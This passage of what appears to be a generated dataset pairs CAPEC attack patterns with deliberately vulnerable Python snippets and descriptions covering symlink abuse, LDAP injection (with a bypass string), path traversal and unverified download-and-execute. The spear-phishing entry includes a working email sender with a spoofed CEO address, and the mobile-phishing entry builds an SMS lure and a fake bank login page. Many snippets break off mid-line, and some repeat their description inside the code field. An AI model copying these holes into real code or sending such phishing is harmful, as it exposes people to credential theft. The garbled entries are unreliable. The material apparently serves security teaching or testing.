        "code_snippet": "def process_user_file(user_filename):\n    # Process a file provided by user\n    user_path = os.path.join('/user/data/', user_filename)\n    \n    # Vulnerable: No validation of symbolic links\n    if os.path.exists(user_path):\n        with open(user_path, 'r') as file:\n            data = file.read()\n            process_data(data)\n\ndef process_data(data):\n    # Process the file contents\n    pass\n\n# Usage\nuser_input = input('Enter filename: ')\nprocess_user_file(user_input)",
        "description": "This code demonstrates a vulnerable file access pattern where the application accepts a user-provided filename and processes it without properly validating symbolic links. An attacker could create a symbolic link in the /user/data directory pointing to sensitive files outside the intended directory, and the application would follow this link. Additionally, there's a potential TOCTOU (Time of Check to Time of Use) race condition between the exists check and file opening."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "\"\"\"\nclass ApplicationServer:\n    def __init__(self):\n        self._debug_mode = False\n        self._admin_mode = False\n        self._hidden_commands = {\n            '--debug': self._enable_debug,\n            '--admin': self._enable_admin,\n            '--dump-config': self._dump_config,\n            '--show-users': self._show_users",
        "description": "\"This code demonstrates a vulnerable application server that contains hidden, undocumented functionality accessible through command-line switches. The server includes debug commands that can expose sensitive information, lacks proper input validation, and silently catches all exceptions without proper handling. The code also implements hidden administrative functions that could be discovered through command fuzzing.\""
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "\"\"\"\ndef send_email(recipient, subject, body):\n    # Vulnerable email header construction without proper sanitization\n    email_headers = f\\\"\\\"\\\"From: admin@example.com\\r\nTo: {recipient",
        "description": "\"This code is vulnerable to email header injection by not properly sanitizing input parameters before constructing email headers. An attacker can inject CRLF sequences (\\\\r\\\\n) to add arbitrary headers, modify email routing, or split the message into multiple parts. The code directly incorporates user input into email headers without escaping or validating special characters, allowing manipulation of the email structure and potentially leading to unauthorized BCCs, content-type modifications, or message splitting.\""
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "def print_user_data(user_input):\n    # Vulnerable format string usage\n    print('User data: ' % user_input)\n\ndef process_log_entry(log_data):\n    log_format = input('Enter log format: ')  # User-controlled format string\n    formatted_log = log_format % log_data\n    with open('app.log', 'a') as f:\n        f.write(formatted_log)\n\n# Example usage\nuser_data = input('Enter data: ')\nprint_user_data(user_data)\nprocess_log_entry({'username': 'admin', 'action': 'login'})",
        "description": "This code demonstrates format string vulnerability by allowing user-controlled format strings in both console output and file operations. The code accepts unvalidated user input as format strings, which can be exploited using format specifiers like %s, %x, or %n to read or write memory locations, potentially leading to information disclosure or arbitrary code execution."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "import ldap\n\ndef authenticate_user(username, password):\n    # Initialize LDAP connection\n    ldap_conn = ldap.initialize('ldap://ldap.example.com')\n    \n    # Vulnerable LDAP query construction\n    search_filter = f'(&(uid={username})(userPassword={password}))'\n    base_dn = 'dc=example,dc=com'\n    \n    try:\n        # Directly using unsanitized input in LDAP search\n        result = ldap_conn.search_s(base_dn, ldap.SCOPE_SUBTREE, search_filter)\n        return len(result) > 0\n    except:\n        return False\n    finally:\n        ldap_conn.unbind()",
        "description": "This code demonstrates a vulnerable LDAP authentication implementation where user input is directly concatenated into the LDAP search filter without proper sanitization. An attacker could inject special characters like * or & to manipulate the query logic. For example, entering '*)(uid=*))(|(uid=*' as username could bypass authentication by creating a valid LDAP filter that always returns true."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "\"\"\"\ndef process_user_request(user_input):\n    base_url = 'http://example.com/api'\n    # Directly append user input to URL without sanitization\n    request_url = f'{base_url",
        "description": "\"This code demonstrates multiple vulnerabilities including parameter pollution through unescaped user input in URLs, exposure of sensitive data through GET requests, and command injection through unsanitized command string construction. The code directly incorporates user input into both URL parameters and system commands without proper encoding or sanitization, allowing an attacker to inject additional parameters or malicious commands.\""
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "\"\"\"\nimport importlib\n\ndef load_and_execute_plugin(user_input):\n    # User provides the module and function name\n    module_name, function_name = user_input.split('.')\n    \n    # Dynamically load the module based on user input\n    try:\n        module = importlib.import_module(module_name)\n        # Get the function from the module using reflection\n        func = getattr(module, function_name)\n        \n        # Execute the function\n        result = func()\n        return result\n    except Exception as e:\n        return str(e)\n\n# Example usage\nuser_provided_input = input(\"Enter module.function to execute: \")\nresult = load_and_execute_plugin(user_provided_input)\n\"\"\",\n    \"description\": \"This code demonstrates unsafe reflection by allowing user input to directly control which modules and functions are loaded and executed through Python's reflection capabilities. The code accepts user input to specify a module and function name, then uses importlib and getattr for dynamic loading and execution without proper validation or sanitization. An attacker could potentially load malicious modules or access sensitive functions they shouldn't be able to reach.\"",
        "description": "\"This code demonstrates unsafe reflection by allowing user input to directly control which modules and functions are loaded and executed through Python's reflection capabilities. The code accepts user input to specify a module and function name, then uses importlib and getattr for dynamic loading and execution without proper validation or sanitization. An attacker could potentially load malicious modules or access sensitive functions they shouldn't be able to reach.\""
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "def read_user_file(user_id, filename):\n    base_path = '/var/www/user_files/'\n    file_path = os.path.join(base_path, user_id, filename)\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except Exception as e:\n        return f'Error reading file: {str(e)}'",
        "description": "This vulnerable code attempts to read a file based on user input without properly sanitizing the path. An attacker could provide inputs like '../../../etc/passwd' as filename to traverse outside the intended directory and access sensitive system files. The code directly concatenates the user input into the file path without checking for directory traversal sequences like '../' or '....//'"
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, session, redirect\nimport secrets\n\napp = Flask(__name__)\napp.secret_key = secrets.token_hex(16)\n\nform_sequence = ['personal_info', 'financial_info', 'confirmation']\nuser_data = {",
        "description": "\"This code demonstrates a vulnerable multi-step form processing system where users can bypass form sequence validation by directly accessing later forms. It lacks proper state management, CSRF protection, and validation of form completion sequence. The application assumes form data integrity without verifying the proper completion of previous steps.\""
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "\"\"\"\nimport requests\nimport json\nfrom cachetools import TTLCache\n\n# Cache to store DNS responses with a TTL of 1 hour\ndns_cache = TTLCache(maxsize=100, ttl=3600)\n\ndef resolve_domain(domain):\n    if domain in dns_cache:\n        # Vulnerable: No validation of cached data\n        return dns_cache[domain]\n    \n    try:\n        # Simulating DNS resolution\n        response = requests.get(f'http://dns-service.example/{domain",
        "description": "\"This code demonstrates vulnerable cache handling that could allow cache poisoning attacks. It stores DNS resolution results without proper verification of authenticity, accepts untrusted backup sources, and doesn't validate cached data. The cache is also globally accessible without access controls, potentially exposing sensitive information to unauthorized actors.\""
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "\"\"\"\nimport dns.resolver\nimport socket\n\ndef resolve_domain(domain_name):\n    # Vulnerable DNS resolver that doesn't verify authenticity\n    try:\n        # Using potentially compromised DNS server without validation\n        resolver = dns.resolver.Resolver()\n        resolver.nameservers = ['8.8.8.8']  # Trusting external DNS server blindly\n        \n        # Perform reverse DNS lookup without verification\n        answers = resolver.resolve(domain_name, 'A')\n        ip_address = str(answers[0])\n        \n        # Vulnerable reverse DNS lookup without validation\n        hostname = socket.gethostbyaddr(ip_address)[0]\n        \n        # No verification if hostname matches original domain\n        return ip_address\n        \n    except Exception as e:\n        return None\n\ndef connect_to_service(domain):\n    ip = resolve_domain(domain)\n    if ip:\n        # Blindly trust the resolved IP without verification\n        socket.create_connection((ip, 80), timeout=10)\n        return True\n    return False\n\"\"\",\n    \"description\": \"This code demonstrates vulnerable DNS resolution by blindly trusting external DNS servers and performing reverse DNS lookups without proper validation. It doesn't verify the authenticity of resolved IP addresses or validate that the reverse DNS matches the original domain, making it susceptible to DNS cache poisoning attacks.\"",
        "description": "\"This code demonstrates vulnerable DNS resolution by blindly trusting external DNS servers and performing reverse DNS lookups without proper validation. It doesn't verify the authenticity of resolved IP addresses or validate that the reverse DNS matches the original domain, making it susceptible to DNS cache poisoning attacks.\""
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "from flask import Flask, send_from_directory\nimport os\n\napp = Flask(__name__)\n\n@app.route('/<path:filename>')\ndef serve_file(filename):\n    root_path = '/var/www/html/'\n    return send_from_directory(root_path, filename)\n\n@app.route('/download_update')\ndef download_update():\n    import urllib.request\n    update_url = 'http://updates.example.com/latest.py'\n    update_code = urllib.request.urlopen(update_url).read()\n    with open('update.py', 'wb') as f:\n        f.write(update_code)\n    os.system('python update.py')\n    return 'Update complete'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This code demonstrates multiple security vulnerabilities including direct file access without authorization checks, exposure of potentially sensitive files under web root, and downloading/executing code without verification. The server allows unrestricted access to any file under the root directory and automatically downloads and executes updates without validating their integrity or source."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "\"\"\"\nfrom flask import Flask, send_file, request\nimport os\n\napp = Flask(__name__)\n\n@app.route('/services/<path:filename>')\ndef serve_file(filename):\n    # Insecure: No authentication check\n    # Insecure: No logging of access attempts\n    file_path = os.path.join('internal_services', filename)\n    if os.path.exists(file_path):\n        return send_file(file_path)\n    \n@app.route('/api/wsdl')\ndef get_wsdl():\n    # Insecure: Exposing sensitive WSDL without access control\n    return send_file('services.wsdl')\n\n@app.route('/update_service')\ndef update_service():\n    # Insecure: Downloads and executes code without validation\n    service_url = request.args.get('url')\n    os.system(f'wget {service_url",
        "description": "\"This vulnerable code demonstrates several security issues: allowing direct access to service files without authentication, exposing WSDL files containing sensitive service information, downloading and executing code without integrity checks, exposing version control repositories, and lacking proper security logging. The application has multiple endpoints that can be discovered through forced browsing and potentially exploited.\""
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "\"\"\"\nimport hashlib\nimport socket\n\ndef send_message(message, host='localhost', port=12345):\n    # Using weak MD5 hash for checksum\n    checksum = hashlib.md5(message.encode()).hexdigest()\n    \n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((host, port))\n    \n    # Sending message and checksum without proper integrity protection\n    sock.send(f\"{message",
        "description": "\"This code demonstrates vulnerable message transmission using weak checksums. It uses MD5 (a weak hash algorithm) for checksums, lacks proper integrity verification mechanisms, and implements basic message transmission without proper channel security. The code is susceptible to checksum spoofing as it doesn't implement any protection against modification of both the message and its checksum during transmission.\""
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "\"\"\"\nimport xml.etree.ElementTree as ET\nfrom urllib.request import urlopen\n\ndef process_external_schema(schema_url, xml_data):\n    # Fetch schema from external URL without validation\n    schema = urlopen(schema_url).read()\n    \n    # Parse XML data using untrusted schema without validation\n    tree = ET.fromstring(xml_data)\n    \n    # Execute XPath query with unvalidated user input\n    user_input = input(\"Enter search term: \")\n    xpath_query = f\"//user[name='{user_input",
        "description": "\"This code is vulnerable because it (1) downloads and uses an XML schema from an external source without validation, (2) processes XML data without schema validation, (3) constructs XPath queries using unsanitized user input, and (4) allows external control of system configuration through XML content. These vulnerabilities enable schema poisoning attacks, XPath injection, and unauthorized system configuration modifications.\""
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "from flask import Flask, request\nimport xml.etree.ElementTree as ET\n\napp = Flask(__name__)\n\n@app.route('/process_xml', methods=['POST'])\ndef process_xml():\n    xml_data = request.data\n    \n    # Process XML without validation or resource limits\n    try:\n        tree = ET.fromstring(xml_data)\n        \n        # Expensive processing of each element\n        for elem in tree.iter():\n            # Recursive parsing and string operations\n            process_element(elem)\n            \n        # Store all processed elements in memory\n        processed_data = []\n        for elem in tree.iter():\n            processed_data.append(str(elem.tag) + str(elem.attrib))\n            \n        return 'XML Processed'\n    except Exception as e:\n        return str(e)\n\ndef process_element(elem):\n    # Simulate expensive processing\n    result = ''\n    for i in range(10000):\n        result += str(elem.tag)\n    return result\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)",
        "description": "This vulnerable code implements a web service that processes XML data without proper validation, resource limits, or throttling. It performs expensive operations on each XML element and stores results in memory, making it susceptible to XML-based DoS attacks. The service accepts any XML input without schema validation, processes every element recursively with expensive operations, and maintains data in memory without limits. Additionally, it runs on all interfaces without TLS, exposing sensitive data in cleartext."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "class ContentManager:\n    def __init__(self):\n        self.content_store = {}\n        self.trusted_sources = ['trusted.com']\n    \n    def store_content(self, source, content, signature=None):\n        # Vulnerable: No verification of content authenticity or source\n        self.content_store[source] = content\n    \n    def deliver_content(self, request):\n        source = request.get('source')\n        # Vulnerable: No validation of request origin or CSRF protection\n        if source in self.content_store:\n            # Vulnerable: Content delivered without checking if it was modified\n            return self.content_store[source]\n    \n    def update_content(self, source, new_content):\n        # Vulnerable: No validation of source identity or content integrity\n        if source:\n            self.content_store[source] = new_content\n            return True\n        return False\n\ndef serve_web_content(request):\n    manager = ContentManager()\n    # Vulnerable: Raw content delivery without parsing or sanitization\n    content = manager.deliver_content(request)\n    # Vulnerable: No verification of destination when sending response\n    return content",
        "description": "This code demonstrates vulnerable content management that allows content spoofing through multiple vectors: lack of source verification, missing content integrity checks, absence of CSRF protection, raw content delivery, and insufficient destination verification. The code allows unauthorized modification and delivery of content without proper authentication or validation mechanisms."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "import tempfile\nimport os\n\ndef process_user_data(user_input):\n    # Create temp file with predictable name in public directory\n    temp_dir = '/tmp'\n    temp_filename = 'userdata_' + user_input + '.tmp'\n    temp_path = os.path.join(temp_dir, temp_filename)\n    \n    # Write sensitive data to temp file with weak permissions\n    with open(temp_path, 'w') as f:\n        f.write('SECRET_API_KEY=abc123\\n')\n        f.write('USER_PASSWORD=password123\\n')\n    \n    os.chmod(temp_path, 0o644)  # World readable permissions\n    \n    # Process the data\n    process_file(temp_path)\n    \n    # Delayed cleanup, leaving file exposed\n    return temp_path",
        "description": "This code creates a temporary file with a predictable name pattern in a public directory using user-controlled input. The file is created with insecure permissions (world-readable) and stores sensitive data. The file cleanup is delayed, leaving it exposed on the filesystem. The predictable naming pattern and insecure permissions make it vulnerable to unauthorized access, symlink attacks, and information disclosure."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "\"\"\"\nimport os\nimport shutil\nimport tempfile\n\ndef store_sensitive_data():\n    # Store sensitive data in predictable locations\n    sensitive_dir = '/etc/app_secrets'\n    if not os.path.exists(sensitive_dir):\n        os.makedirs(sensitive_dir)\n    \n    # Write sensitive data to files with predictable names\n    with open('/etc/app_secrets/credentials.txt', 'w') as f:\n        f.write('admin_password=secretpass123')\n    \n    # Create temporary files without proper cleanup\n    temp_file = tempfile.NamedTemporaryFile(delete=False)\n    temp_file.write(b'encryption_key=ABC123')\n    temp_file.close()\n    \n    # Set overly permissive permissions\n    os.chmod('/etc/app_secrets', 0o777)\n    os.chmod('/etc/app_secrets/credentials.txt', 0o666)\n    \n    # Leave debug data in well-known location\n    with open('/var/log/debug_trace.log', 'w') as f:\n        f.write('DEBUG: encryption_key=ABC123\\\\nDEBUG: admin_token=XYZ789')\n\"\"\",\n    \"description\": \"This code demonstrates vulnerable practices by storing sensitive data in well-known, predictable locations with improper permissions, failing to properly clean up temporary files, and leaving debug information exposed. The code creates directories and files in common locations (/etc), uses insufficient file permissions, and leaves sensitive data in debug logs. It fails to implement proper data scrubbing and creates exploitable conditions where sensitive information could be accessed by unauthorized parties.\"",
        "description": "\"This code demonstrates vulnerable practices by storing sensitive data in well-known, predictable locations with improper permissions, failing to properly clean up temporary files, and leaving debug information exposed. The code creates directories and files in common locations (/etc), uses insufficient file permissions, and leaves sensitive data in debug logs. It fails to implement proper data scrubbing and creates exploitable conditions where sensitive information could be accessed by unauthorized parties.\""
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "class AuthenticationSystem:\n    def __init__(self):\n        self.auth_tokens = {}\n        self.trusted_ips = ['192.168.1.1']\n    \n    def authenticate(self, request):\n        # Vulnerable: Assumes IP-based authentication is sufficient\n        client_ip = request.get('ip_address')\n        if client_ip in self.trusted_ips:\n            return True\n        \n        # Vulnerable: No validation of token integrity\n        auth_token = request.get('auth_token')\n        if auth_token and auth_token in self.auth_tokens:\n            return True\n            \n        # Vulnerable: Accepts any admin flag without verification\n        if request.get('is_admin') == True:\n            return True\n            \n        return False\n\n    def process_request(self, request):\n        if self.authenticate(request):\n            return 'Access granted'\n        return 'Access denied'",
        "description": "This code demonstrates multiple authentication vulnerabilities including IP spoofing, token authentication bypass, and assumed-immutable data. It trusts client-provided IP addresses, doesn't validate token authenticity, and blindly trusts a client-provided admin flag. An attacker can easily bypass authentication by spoofing these values."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "def process_user_data(data):\n    # No validation of input type or format\n    user_role = data.get('role')\n    user_id = data.get('id')\n\n    if user_role == 'admin':\n        # Dangerous: relies on untrusted input for security decision\n        admin_actions = {\n            'view_all': lambda: get_all_user_data(),\n            'modify': lambda x: modify_user_records(x),\n            'delete': lambda x: delete_user_record(x)\n        }\n        action = data.get('action')\n        if action in admin_actions:\n            return admin_actions[action]()\n    \n    return {'status': 'access denied'}",
        "description": "This code demonstrates improper input validation by accepting user data without validating its type, format, or structure. It makes security decisions based on untrusted input (user_role) and executes admin actions without proper validation of the action parameter. An attacker could manipulate the input data structure to bypass security controls and gain unauthorized access to admin functions."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "\"\"\"\ndef process_resource_request(url, user_token):\n    # No validation of URL origin or proper URL parsing\n    import requests\n    \n    # Blindly trust the provided URL without checking if it's authorized\n    response = requests.get(url, headers={'Authorization': user_token",
        "description": "\"This vulnerable code accepts any URL without proper validation of its origin or authenticity. It misrepresents the resource source in the UI by only showing partial information, potentially hiding malicious origins. The code lacks proper channel verification and destination checking, making it susceptible to request forgery and spoofing attacks. The authentication token is used without verifying the actual destination, allowing potential credential exposure to unintended endpoints.\""
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "import tempfile\nimport os\n\ndef process_user_data(user_data):\n    # Create temporary file in system temp directory with default permissions\n    temp_file = tempfile.mktemp()\n    \n    # Write sensitive data to temp file\n    with open(temp_file, 'w') as f:\n        f.write(f'SSN: {user_data[\"ssn\"]}')\n        f.write(f'Credit Card: {user_data[\"cc_number\"]}')\n    \n    # Process the data\n    process_sensitive_info(temp_file)\n    \n    # Attempt to remove the file, but file might persist\n    try:\n        os.remove(temp_file)\n    except:\n        pass\n\ndef cache_user_session(session_data):\n    cache_dir = '/var/www/html/cache/'\n    cache_file = os.path.join(cache_dir, 'session_cache.txt')\n    \n    # Write session data to cache under web root\n    with open(cache_file, 'w') as f:\n        f.write(str(session_data))",
        "description": "This code demonstrates multiple temp file vulnerabilities: using mktemp() which is race-condition prone, storing sensitive data in temp files with default permissions, placing cache files under web root, and improper cleanup of sensitive data. The code creates temporary files without secure permissions and stores sensitive information in cache directories accessible to unauthorized users."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "\"\"\"\nimport socket\nimport threading\n\ndef send_sensitive_data():\n    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    client.connect(('banking.example.com', 80))\n    \n    # Sensitive data transmitted in cleartext\n    username = 'admin'\n    password = 'secret123'\n    account_number = '1234567890'\n    \n    # Send data without encryption\n    data = f'username={username",
        "description": "\"This code demonstrates a vulnerable implementation of a client-server communication system that transmits sensitive financial data. The code violates multiple security principles by sending unencrypted sensitive data (CWE-311, CWE-319), lacking message integrity checks (CWE-924), and establishing cleartext communication channels that are susceptible to sniffing attacks. The server accepts and processes incoming data without any encryption or validation, making it vulnerable to unauthorized monitoring and interception.\""
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "import socket\nimport json\n\ndef send_sensitive_data(server_address, data):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        sock.connect(server_address)\n        # Send sensitive data in plaintext\n        message = json.dumps({\n            'username': 'admin',\n            'password': 'secret123',\n            'credit_card': '4532-7153-3790-4421',\n            'ssn': '123-45-6789',\n            'system_info': {\n                'os': 'Linux',\n                'version': '5.4.0',\n                'services': ['ssh', 'mysql', 'apache']\n            }\n        })\n        sock.sendall(message.encode())\n        \n        # Receive response without verification\n        response = sock.recv(1024)\n        return response.decode()\n    finally:\n        sock.close()\n\n# Usage\nserver = ('localhost', 8080)\nresponse = send_sensitive_data(server, 'sensitive_data')",
        "description": "This vulnerable code demonstrates transmission of sensitive data in cleartext over a network connection. It includes unencrypted passwords, credit card numbers, SSNs, and system information. The code lacks encryption, authentication verification, and traffic volume control, making it susceptible to network sniffing attacks. Additionally, there's no protection against capture-replay attacks as the communication is not secured with any form of session tokens or encryption."
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "import sys\nimport os\n\ndef load_custom_library(library_path):\n    # Add user-provided path to system path\n    sys.path.insert(0, library_path)\n    \n    try:\n        # Dynamically import library without validation\n        library_name = 'user_provided_lib'\n        custom_lib = __import__(library_name)\n        \n        # Execute function from the loaded library\n        result = custom_lib.process_data()\n        return result\n    except Exception as e:\n        print(f'Error loading library: {e}')\n\ndef main():\n    # Accept library path from user input without validation\n    user_lib_path = input('Enter path to library: ')\n    \n    # Use library path directly without sanitization\n    if os.path.exists(user_lib_path):\n        result = load_custom_library(user_lib_path)\n        print(f'Library execution result: {result}')\n\nif __name__ == '__main__':\n    main()",
        "description": "This vulnerable code allows unrestricted library loading based on user input. It adds an untrusted path to the system path and attempts to import a library without proper validation. An attacker could exploit this by providing a malicious library path or using symbolic links to redirect the import to unauthorized code. The code demonstrates CWE-426 (Untrusted Search Path) and CWE-73 (External Control of File Name or Path) by allowing direct control over the library path and importing process."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/profile')\ndef profile():\n    # Get user input from URL parameter\n    user_input = request.args.get('name', '')\n    \n    # Vulnerable template that directly injects user input\n    template = '''<h1>Welcome!</h1>\n    <div>Hello ''' + user_input + '''</div>\n    <script>document.write('Last visited: ' + localStorage.getItem('lastVisit'));</script>'''\n    \n    # Directly renders the template with unvalidated input\n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This code demonstrates a vulnerable web application that accepts user input and directly injects it into an HTML template without proper sanitization. The application uses Flask's template_string rendering which can be exploited through XSS by injecting malicious JavaScript code in the 'name' parameter. The code also includes client-side scripting that could be manipulated through template injection attacks."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "\"\"\"\nimport socket\nimport ssl\nimport json\n\nclass VulnerableRouter:\n    def __init__(self):\n        self.routing_table = {",
        "description": "\"This code implements a vulnerable network routing system that fails to properly validate endpoints, verify message integrity, or protect sensitive system information. It demonstrates weaknesses in endpoint authentication, message routing, and system information exposure. The code uses unverified SSL contexts and lacks proper destination validation, making it susceptible to pharming attacks where messages can be redirected to malicious endpoints.\""
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "class ECommerceCheckout:\n    def process_order(self, form_data):\n        # Vulnerable: Blindly trusting client-side data for price calculation\n        item_price = float(form_data['price'])\n        quantity = int(form_data['quantity'])\n        discount = float(form_data['discount'])\n        \n        # Calculate total using unvalidated client-side values\n        total = item_price * quantity * (1 - discount)\n        \n        # Process payment with manipulated values\n        order = {\n            'user_id': form_data['user_id'],\n            'total': total,\n            'payment_status': 'success'\n        }\n        \n        return self.complete_transaction(order)\n    \n    def complete_transaction(self, order):\n        # Stores transaction without verifying original prices\n        # or validating user authorization\n        return {'status': 'Order processed', 'total_charged': order['total']}",
        "description": "This vulnerable code demonstrates a classic e-commerce security flaw where the server blindly trusts client-side data for price calculations. The code accepts price, quantity, and discount values from form data without validating against server-side stored values, allowing attackers to manipulate these fields in the client-side HTML form to reduce the final price. It also lacks proper authorization checks and server-side validation of transaction parameters."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "from flask import Flask, redirect, request\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\napp = Flask(__name__)\n\n@app.route('/redirect')\ndef unsafe_redirect():\n    target = request.args.get('url')\n    return redirect(target)  # Vulnerable to open redirect\n\ndef send_phishing_email(target_info):\n    sender = \"ceo@legitimate-company.com\"  # Spoofed sender\n    msg = MIMEMultipart()\n    msg['From'] = sender\n    msg['To'] = target_info['email']\n    msg['Subject'] = f\"Important: {target_info['company']} Account Security\"\n    \n    # Personalized content using target information\n    body = f\"Dear {target_info['name']},\\n\\nAs a {target_info['position']} at {target_info['company']}, \"\n    body += f\"we detected suspicious activity on your account. \"\n    body += f\"Please verify your credentials at: http://malicious-site.com/login?redirect={target_info['company']}\"\n    \n    msg.attach(MIMEText(body, 'plain'))\n    \n    server = smtplib.SMTP('smtp.evil-server.com')\n    server.send_message(msg)\n    server.quit()\n\ntarget_info = {\n    'name': 'John Smith',\n    'email': 'john.smith@company.com',\n    'company': 'ACME Corp',\n    'position': 'Financial Manager'\n}\n\nsend_phishing_email(target_info)",
        "description": "This code demonstrates a spear phishing attack implementation that combines email spoofing with an open redirect vulnerability. The code creates personalized phishing emails using target-specific information and sends them through a mail server. The Flask endpoint implements an unsafe redirect that could be used in phishing URLs. The email appears to come from a legitimate source and contains personalized information to increase credibility."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "class MobileAuthentication:\n    def __init__(self):\n        self.attempts = {}\n        self.user_credentials = {'user123': 'password123'}\n\n    def send_sms_link(self, phone_number, message):\n        phishing_url = f'https://bank-secure-login.evil.com/?phone={phone_number}'\n        message = f'URGENT: Your account needs verification. Click here: {phishing_url}'\n        return self.send_sms(phone_number, message)\n\n    def login_page(self, phone_number):\n        html = f'''\n        <html><body style='font-family: Arial;'>\n        <div style='text-align: center;'>\n            <img src='https://legitimate-bank.com/logo.png' style='width: 200px;'>\n            <h2>Secure Login Required</h2>\n            <form method='POST' action='/login'>\n                <input type='hidden' name='phone' value='{phone_number}'>\n                <input type='text' name='username' placeholder='Username'><br>\n                <input type='password' name='password' placeholder='Password'><br>\n                <button type='submit'>Login</button>\n            </form>\n        </div>\n        </body></html>\n        '''\n        return html\n\n    def verify_login(self, username, password, phone):\n        if phone not in self.attempts:\n            self.attempts[phone] = 0\n        self.attempts[phone] += 1\n        \n        if self.attempts[phone] > 100:  # No real limit on login attempts\n            return False\n            \n        if username in self.user_credentials and self.user_credentials[username] == password:\n            return True\n        return False\n\n    def send_sms(self, phone_number, message):\n        # Simulated SMS sending\n        pass",
        "description": "This code demonstrates a vulnerable mobile authentication system that could be exploited for phishing attacks. It includes several security flaws: no rate limiting on login attempts (CWE-307), single-factor authentication (CWE-308), spoofable UI elements (CWE-451), and poor password handling (CWE-309). The system sends phishing SMS messages with links to a fake login page that mimics a legitimate bank site, potentially tricking users into entering their credentials."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "\"\"\"\nimport os\nimport shutil\n\ndef process_user_file(user_filename, target_dir):\n    # Blindly accept user-provided filename and target directory\n    file_path = os.path.join(target_dir, user_filename)\n    \n    # Create temporary file with predictable name\n    temp_file = '/tmp/process_' + user_filename\n    \n    # Determine file type based only on extension\n    file_ext = user_filename.split('.')[-1]\n    \n    if file_ext == 'txt':\n        # Process text file\n        with open(file_path, 'r') as f:\n            data = f.read()\n        \n        # Write to temporary file without checks\n        with open(temp_file, 'w') as tf:\n            tf.write(data)\n            \n        # Move file to final destination without validation\n        shutil.move(temp_file, os.path.join('/usr/local/app/', user_filename))\n            \n    elif file_ext == 'exe':\n        # Dangerous: directly execute file based on extension\n        os.system(file_path)\n\"\"\",\n    \"description\": \"This vulnerable code demonstrates multiple file manipulation issues: it accepts unrestricted file paths and names from users, relies solely on file extensions for processing decisions, creates insecure temporary files, lacks path traversal protection, and performs dangerous operations based on user input. An attacker could exploit this by providing malicious filenames, using path traversal sequences, or manipulating file extensions to trigger unintended behaviors.\"",
        "description": "\"This vulnerable code demonstrates multiple file manipulation issues: it accepts unrestricted file paths and names from users, relies solely on file extensions for processing decisions, creates insecure temporary files, lacks path traversal protection, and performs dangerous operations based on user input. An attacker could exploit this by providing malicious filenames, using path traversal sequences, or manipulating file extensions to trigger unintended behaviors.\""
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "\"\"\"\nclass SecuritySystem:\n    def __init__(self):\n        self.is_authenticated = False\n        self.security_settings = {\n            'encryption': True,\n            'access_level': 'restricted',\n            'firewall': True",
        "description": "\"This vulnerable code demonstrates a security system that fails to properly authenticate critical operations, doesn't preserve security settings during power state transitions, and allows unauthorized reset of security configurations. The system's security settings can be manipulated through power state transitions or direct resets without proper authentication or state verification.\""
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
